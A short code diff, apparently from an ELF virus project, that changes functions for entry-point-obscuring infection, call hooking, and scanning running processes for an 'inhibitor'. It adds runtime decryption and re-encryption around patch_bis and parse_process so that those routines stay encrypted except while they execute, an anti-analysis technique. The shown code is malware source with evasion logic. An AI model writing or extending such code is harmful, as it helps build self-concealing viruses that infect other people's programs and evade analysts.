@@ -244,7 +244,9 @@ void		epo_parsing(t_info *info)
 				key2 = decrypt_func(info, &hook_call, info->tab_addr[7] - info->tab_addr[6], 6);
 				hook_call(info, nb);
 				reencrypt_func(info, &hook_call, info->tab_addr[7] - info->tab_addr[6], key2);
+				key2 = decrypt_func(info, &patch_bis, info->tab_addr[16] - info->tab_addr[15], 15);
 				patch_bis(info, nb);
+				reencrypt_func(info, &patch_bis, info->tab_addr[16] - info->tab_addr[15], key2);
 			}
 			nb_call_detected++;
 		}
@@ -300,7 +302,7 @@ int		parse_process(char *path, int pid_len, char *buf_inhibitor)
 	return (1);
 }
 
-int		check_process(char *path)
+int		check_process(char *path, t_info *info)
 {
 	char			buf_d[1024];
 	char			buf_stat[8];
@@ -325,10 +327,10 @@ int		check_process(char *path)
 				ft_strcat(buf_path_file, dir->d_name);
 				ft_strcat(buf_path_file, buf_stat);
 				pid_len = ft_strlen(dir->d_name);
-// 				uint32_t key = decrypt_func(info, &parse_process, info->tab_addr[11] - info->tab_addr[10], 10);
-// 				int ret = parse_process(buf_path_file, pid_len, buf_inhibitor);
-// 				reencrypt_func(info, &parse_process, info->tab_addr[x + 1] - info->tab_addr[x], key);
-				if ((parse_process(buf_path_file, pid_len, buf_inhibitor)) == 1)
+ 				uint32_t key = decrypt_func(info, &parse_process, info->tab_addr[11] - info->tab_addr[10], 10);
+ 				int ret = parse_process(buf_path_file, pid_len, buf_inhibitor);
+ 				reencrypt_func(info, &parse_process, info->tab_addr[10 + 1] - info->tab_addr[10], key);
+				if (ret == 1)
 					goto found;
 			}
 			pos += dir->d_reclen;
